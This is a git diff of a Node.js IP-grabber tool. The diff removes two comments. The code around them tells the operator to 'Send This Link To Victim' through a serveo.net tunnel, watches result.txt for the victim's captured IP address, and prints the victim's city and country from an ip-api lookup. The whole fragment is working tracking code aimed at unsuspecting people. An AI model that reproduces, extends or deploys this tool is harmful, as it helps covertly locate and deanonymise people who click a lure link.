@@ -48,8 +48,6 @@ user.question(userinput, (q) => {
     console.log(c.blue("[ Send This Link To Victim ] > " + `${q}` + ".serveo.net"));
    
     loading("Listening...\n\n").start();
-    
-     // Watch file changes and send the result to ip-api website
     f.watchFile("result.txt", function(current, previous){
     var a = f.readFileSync("result.txt", "utf8");
     var ipvictim = a.substr(7, 13);
@@ -58,8 +56,6 @@ user.question(userinput, (q) => {
     console.log(c.red("\n[!] Type Ctrl + c To Exit"))
     console.log(style.cyan(check.success, "[IP] : " + ipvictim));
     notif(3);
-
-    // Print the result to console
     console.log(style.green("[:–––––––––––––––––––:]"))
     console.log(style.white(check.warning, "{ City } > " + js["city"]));
     console.log(style.white(check.warning, "{ Country } > " + js["country"]));
